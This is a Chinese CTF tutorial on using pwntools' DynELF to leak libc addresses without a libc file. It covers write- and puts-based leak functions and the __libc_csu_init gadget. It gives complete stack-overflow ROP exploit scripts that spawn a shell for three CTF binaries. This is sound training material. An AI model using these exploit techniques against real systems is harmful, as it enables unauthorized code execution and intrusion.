# 借助DynELF实现无libc的漏洞利用小结

> 作者： [tianyi201612@安全客](http://bobao.360.cn/member/contribute?uid=2802113352)

> 来源：http://bobao.360.cn/learning/detail/3298.html

预估稿费：400RMB（不服你也来投稿啊！）

投稿方式：发送邮件至 [linwei#360.cn](mailto:linwei@360.cn) ，或登陆网页版在线投稿

#### 前言

在没有目标系统libc文件的情况下，我们可以使用pwntools的DynELF模块来泄漏地址信息，从而获取到shell。本文针对linux下的puts和write，分别给出了实现DynELF关键函数leak的方法，并通过3道CTF题目介绍了这些方法的具体应用情况。

#### DynELF

DynELF是pwntools中专门用来应对无libc情况的漏洞利用模块，其基本代码框架如下。

```
p = process('./xxx')
def leak(address):
  #各种预处理
  payload = "xxxxxxxx" + address + "xxxxxxxx"
  p.send(payload)
  #各种处理
  data = p.recv(4)
  log.debug("%#x => %s" % (address, (data or '').encode('hex')))
  return data
d = DynELF(leak, elf=ELF("./xxx"))      #初始化DynELF模块 
systemAddress = d.lookup('system', 'libc')  #在libc文件中搜索system函数的地址
```

需要使用者进行的工作主要集中在leak函数的具体实现上，上面的代码只是个模板。其中，address就是leak函数要泄漏信息的所在地址，而payload就是触发目标程序泄漏address处信息的攻击代码。

#### 使用条件

不管有没有libc文件，要想获得目标系统的system函数地址，首先都要求目标二进制程序中存在一个能够泄漏目标系统内存中libc空间内信息的漏洞。同时，由于我们是在对方内存中不断搜索地址信息，故我们需要这样的信息泄露漏洞能够被反复调用。以下是大致归纳的主要使用条件：

1）目标程序存在可以泄露libc空间信息的漏洞，如read@got就指向libc地址空间内；

2）目标程序中存在的信息泄露漏洞能够反复触发，从而可以不断泄露libc地址空间内的信息。

当然，以上仅仅是实现利用的基本条件，不同的目标程序和运行环境都会有一些坑需要绕过。接下来，我们主要针对write和puts这两个普遍用来泄漏信息的函数在实际配合DynELF工作时可能遇到的问题，给出相应的解决方法。

#### write函数

write函数原型是write(fd, addr, len)，即将addr作为起始地址，读取len字节的数据到文件流fd（0表示标准输入流stdin、1表示标准输出流stdout）。write函数的优点是可以读取任意长度的内存信息，即它的打印长度只受len参数控制，缺点是需要传递3个参数，特别是在x64环境下，可能会带来一些困扰。

在x64环境下，函数的参数是通过寄存器传递的，rdi对应第一个参数，rsi对应第二个参数，rdx对应第三个参数，往往凑不出类似“pop rdi; ret”、“pop rsi; ret”、“pop rdx; ret”等3个传参的gadget。此时，可以考虑使用__libc_csu_init函数的通用gadget，具体原理请参见 [文章](http://www.cnblogs.com/Ox9A82/p/5487725.html) 。简单的说，就是通过__libc_csu_init函数的两段代码来实现3个参数的传递，这两段代码普遍存在于x64二进制程序中，只不过是间接地传递参数，而不像原来，是通过pop指令直接传递参数。

第一段代码如下：

```
.text:000000000040075A   pop  rbx  #需置为0，为配合第二段代码的call指令寻址
.text:000000000040075B   pop  rbp  #需置为1
.text:000000000040075C   pop  r12  #需置为要调用的函数地址，注意是got地址而不是plt地址，因为第二段代码中是call指令
.text:000000000040075E   pop  r13  #write函数的第三个参数
.text:0000000000400760   pop  r14  #write函数的第二个参数
.text:0000000000400762   pop  r15  #write函数的第一个参数
.text:0000000000400764   retn
```

第二段代码如下：

```
.text:0000000000400740   mov  rdx, r13
.text:0000000000400743   mov  rsi, r14
.text:0000000000400746   mov  edi, r15d
.text:0000000000400749   call  qword ptr [r12+rbx*8]
```

这两段代码运行后，会将栈顶指针移动56字节，我们在栈中布置56个字节即可。

这样，我们便解决了write函数在leak信息中存在的问题，具体的应用会放到后面的3道题目中讲。

#### puts函数

puts的原型是puts(addr)，即将addr作为起始地址输出字符串，直到遇到“\x00”字符为止。也就是说，puts函数输出的数据长度是不受控的，只要我们输出的信息中包含\x00截断符，输出就会终止，且会自动将“\n”追加到输出字符串的末尾，这是puts函数的缺点，而优点就是需要的参数少，只有1个，无论在x32还是x64环境下，都容易调用。

为了克服输入不受控这一缺点，我们考虑利用puts函数输出的字符串最后一位为“\n“这一特点，分两种情况来解决。

（1）puts输出完后就没有其他输出 ， 在这种情况下的leak函数可以这么写。

```
def leak(address):
  count = 0
  data = ''
  payload = xxx
  p.send(payload)
  print p.recvuntil('xxx\n') #一定要在puts前释放完输出
  up = ""
  while True:
    #由于接收完标志字符串结束的回车符后，就没有其他输出了，故先等待1秒钟，如果确实接收不到了，就说明输出结束了
    #以便与不是标志字符串结束的回车符（0x0A）混淆，这也利用了recv函数的timeout参数，即当timeout结束后仍得不到输出，则直接返回空字符串””
    c = p.recv(numb=1, timeout=1)
    count += 1
    if up == '\n' and c == "":  #接收到的上一个字符为回车符，而当前接收不到新字符，则
      buf = buf[:-1]             #删除puts函数输出的末尾回车符
      buf += "\x00"
      break
    else:
      buf += c
    up = c
  data = buf[:4]  #取指定字节数
  log.info("%#x => %s" % (address, (data or '').encode('hex')))
  return data
```

（2）puts输出完后还有其他输出 ， 在这种情况下的leak函数可以这么写。

```
def leak(address):
  count = 0
  data = ""
  payload = xxx
  p.send(payload)
  print p.recvuntil("xxx\n")) #一定要在puts前释放完输出
  up = ""
  while True:
    c = p.recv(1)
    count += 1
    if up == '\n' and c == "x":  #一定要找到泄漏信息的字符串特征
      data = buf[:-1]                     
      data += "\x00"
      break
    else:
      buf += c
    up = c
  data = buf[:4] 
  log.info("%#x => %s" % (address, (data or '').encode('hex')))
  return data
```

其他需要注意的地址

在信息泄露过程中，由于循环制造溢出，故可能会导致栈结构发生不可预料的变化，可以尝试调用目标二进制程序的_start函数来重新开始程序以恢复栈。

XDCTF2015-pwn200

本题是32位linux下的二进制程序，无cookie，存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件。具体的栈溢出位置等调试过程就不细说了，只简要说一下 **借助DynELF实现利用的要点：**

1）调用write函数来泄露地址信息，比较方便；

2）32位linux下可以通过布置栈空间来构造函数参数，不用找gadget，比较方便；

3）在泄露完函数地址后，需要重新调用一下_start函数，用以恢复栈；

4）在实际调用system前，需要通过三次pop操作来将栈指针指向systemAddress，可以使用ropper或ROPgadget来完成。

接下来就直接给出利用代码。

```
from pwn import *
import binascii
p = process("./xdctf-pwn200")
elf = ELF("./xdctf-pwn200")
writeplt = elf.symbols['write']
writegot = elf.got['write']
readplt = elf.symbols['read']
readgot = elf.got['read']
vulnaddress =  0x08048484 
startaddress = 0x080483d0      #调用start函数，用以恢复栈
bssaddress =   0x0804a020    #用来写入“/bin/sh\0”字符串
def leak(address):
  payload = "A" * 112
  payload += p32(writeplt)
  payload += p32(vulnaddress)
  payload += p32(1)
  payload += p32(address)
  payload += p32(4)
  p.send(payload)
  data = p.recv(4)
  print "%#x => %s" % (address, (data or '').encode('hex'))
  return data
print p.recvline()
dynelf = DynELF(leak, elf=ELF("./lctf-pwn200"))
systemAddress = dynelf.lookup("__libc_system", "libc") 
print "systemAddress:", hex(systemAddress)
#调用_start函数，恢复栈
payload1 = "A" * 112
payload1 += p32(startaddress) 
p.send(payload1)
print p.recv()
ppprAddress = 0x0804856c  #获取到的连续3次pop操作的gadget的地址 
payload1 = "A" * 112
payload1 += p32(readplt)
payload1 += p32(ppprAddress)
payload1 += p32(0)
payload1 += p32(bssaddress)
payload1 += p32(8)
payload1 += p32(systemAddress) + p32(vulnaddress) + p32(bssaddress)
p.send(payload1)
p.send('/bin/sh\0')
p.interactive()
```

LCTF2016-pwn100

本题是64位linux下的二进制程序，无cookie，也存在很明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件，但和上一题相比，存在两处差异：

1）64位linux下的函数需要通过rop链将参数传入寄存器，而不是依靠栈布局；

2）puts函数与write函数不同，不能指定输出字符串的长度。

根据上文给出的解决方法，构造利用脚本如下。

```
from pwn import *
import binascii
p = process("./pwn100")
elf = ELF("./pwn100")
readplt = elf.symbols['read']
readgot = elf.got['read']
putsplt = elf.symbols['puts']
putsgot = elf.got['puts']
mainaddress =   0x4006b8
startaddress =   0x400550
poprdi =     0x400763
pop6address  =  0x40075a   
movcalladdress = 0x400740
waddress =     0x601000 #可写的地址，bss段地址在我这里好像不行，所以选了一个别的地址，应该只要不是readonly的地址都可以 
def leak(address):
  count = 0
  data = ''
  payload = "A" * 64 + "A" * 8
  payload += p64(poprdi) + p64(address)
  payload += p64(putsplt)
  payload += p64(startaddress)
  payload = payload.ljust(200, "B")
  p.send(payload)
  print p.recvuntil('bye~\n')
  up = ""
  while True:
    c = p.recv(numb=1, timeout=0.5)
    count += 1
    if up == '\n' and c == "":
      data = data[:-1]
      data += "\x00"
      break
    else:
      data += c
    up = c
  data = data[:4]
  log.info("%#x => %s" % (address, (data or '').encode('hex')))
  return data
d = DynELF(leak, elf=ELF('./pwn100'))
systemAddress = d.lookup('__libc_system', 'libc')
print "systemAddress:", hex(systemAddress)
print "-----------write /bin/sh to bss--------------"
payload1 = "A" * 64 + "A" * 8
payload1 += p64(pop6address) + p64(0) + p64(1) + p64(readgot) + p64(8) + p64(waddress) + p64(0)
payload1 += p64(movcalladdress)
payload1 += '\x00'*56
payload1 += p64(startaddress)
payload1 =  payload1.ljust(200, "B")
p.send(payload1)
print p.recvuntil('bye~\n')
p.send("/bin/sh\x00")
print "-----------get shell--------------"
payload2 = "A" * 64 + "A" * 8
payload2 += p64(poprdi) + p64(waddress)
payload2 += p64(systemAddress)
payload2 += p64(startaddress)
payload2 =  payload2.ljust(200, "B")
p.send(payload2)
p.interactive()
```

RCTF2015-welpwn

本题也是64位linux下的二进制程序，无cookie，也存在明显的栈溢出漏洞，且可以循环泄露，符合我们使用DynELF的条件，与其他两题的区别主要在于利用过程比较绕。

整个程序逻辑是这样的，main函数中，用户可以输入1024个字节，并通过echo函数将输入复制到自身栈空间，但该栈空间很小，使得栈溢出成为可能。由于复制过程中，以“\x00”作为字符串终止符，故如果我们的payload中存在这个字符，则不会复制成功；但实际情况是，因为要用到上面提到的通用gadget来为write函数传参，故肯定会在payload中包含“\x00”字符。

这个题目设置了这个障碍，也为这个障碍的绕过提供了其他条件。即由于echo函数的栈空间很小，与main函数栈中的输入字符串之间只间隔32字节，故我们可以利用这一点，只复制过去24字节数据加上一个包含连续4个pop指令的gadget地址，并借助这个gadget跳过原字符串的前32字节数据，即可进入我们正常的通用gadget调用过程，具体脚本如下。

```
from pwn import *
import binascii
p = process("./welpwn")
elf = ELF("welpwn")
readplt = elf.symbols["read"]
readgot = elf.got["read"]
writeplt = elf.symbols["write"]
writegot = elf.got["write"]
startAddress =    0x400630
popr12r13r14r15  = 0x40089c
pop6address    = 0x40089a
movcalladdress  = 0x400880
def leak(address):
  print p.recv(1024)
  payload = "A" * 24
  payload += p64(popr12r13r14r15)
  payload += p64(pop6address) + p64(0) + p64(1) + p64(writegot) + p64(8) + p64(address) + p64(1)
  payload += p64(movcalladdress)
  payload += "A" * 56
  payload += p64(startAddress)
  payload =  payload.ljust(1024, "C")
  p.send(payload)
  data = p.recv(4)
  print "%#x => %s" % (address, (data or '').encode('hex'))
  return data
dynelf = DynELF(leak, elf=ELF("./welpwn"))
systemAddress = dynelf.lookup("__libc_system", "libc")
print hex(systemAddress)
bssAddress = 0x601070
poprdi =     0x4008a3
print p.recv(1024)
payload = "A" * 24
payload += p64(popr12r13r14r15)
payload += p64(pop6address) + p64(0) + p64(1) + p64(readgot) + p64(8) + p64(bssAddress) + p64(0)
payload += p64(movcalladdress)
payload += "A" * 56
payload += p64(poprdi)
payload += p64(bssAddress)
payload += p64(systemAddress)
payload = payload.ljust(1024, "C")
p.send(payload)
p.send("/bin/sh\x00")
p.interactive()
```

由于该题目程序中也包含puts函数，故我们也可以用puts函数来实现leak，代码如下。

```
def leak(address):
  count = 0
  data = ''
  print p.recv(1024)
  payload = "A" * 24
  payload += p64(popr12r13r14r15)
  payload += p64(poprdi) + p64(address)
  payload += p64(putsplt)
  payload += p64(startAddress)
  payload = payload.ljust(1020, "B")
  p.send(payload)
  #由于echo函数最后会输出复制过去的字符串，而该字符串是popr12r13r14r15，故我们可以将该gadget的地址作为判断输出结束的依据
  print p.recvuntil("\x9c\x08\x40") 
  up = ""
  while True:
    c = p.recv(1)
    count += 1
    if up == '\n' and c == "W": #下一轮输出的首字母就是“Welcome”中的“W”
      data = data[:-1]
      data += "\x00"
      break
    else:
      data += c
    up = c
  data = data[:4]
  print "%#x => %s" % (address, (data or '').encode('hex'))
  return data
```

参考文章

[Pwntools中的DynELF模块的使用](http://klaus.link/2016/Python-Pwntools-DynELF%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8/)

[Finding Function's Load Address](http://uaf.io/exploitation/misc/2016/04/02/Finding-Functions.html)

[ __libc_csu_init函数的通用gadget](http://www.cnblogs.com/Ox9A82/p/5487725.html)

附件

题目打包下载 ： [http://pan.baidu.com/s/1qXA9JXi](http://pan.baidu.com/s/1qXA9JXi)

![](http://img1.tuicool.com/F7zaMnz.jpg!web) ![](http://img1.tuicool.com/UBbiuae.jpg!web)

本文由 安全客 原创发布，如需转载请注明来源及本文地址。

本文地址：http://bobao.360.cn/learning/detail/3298.html